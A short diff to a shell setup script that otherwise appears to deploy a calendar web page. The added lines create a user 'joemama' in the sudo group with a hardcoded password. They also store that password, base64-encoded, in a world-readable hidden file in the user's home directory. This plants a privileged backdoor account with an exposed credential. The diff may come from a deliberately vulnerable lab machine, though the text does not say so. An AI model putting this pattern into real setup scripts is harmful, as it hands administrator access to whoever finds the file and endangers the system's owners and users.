@@ -78,3 +78,11 @@ Move calendar directory to html directory.
 </body>
 </html> 
 EOF
+
+# Add user and give sudo privs
+useradd -m -g sudo -p $(openssl passwd -1 SuperSecretPassword!12) joemama
+
+# Create hidden file and insert base64 hash of password
+echo "U3VwZXJTZWNyZXRQYXNzd29yZCExMg==" > /home/joemama/.passReminder
+chmod 444 /home/joemama/.passReminder
+
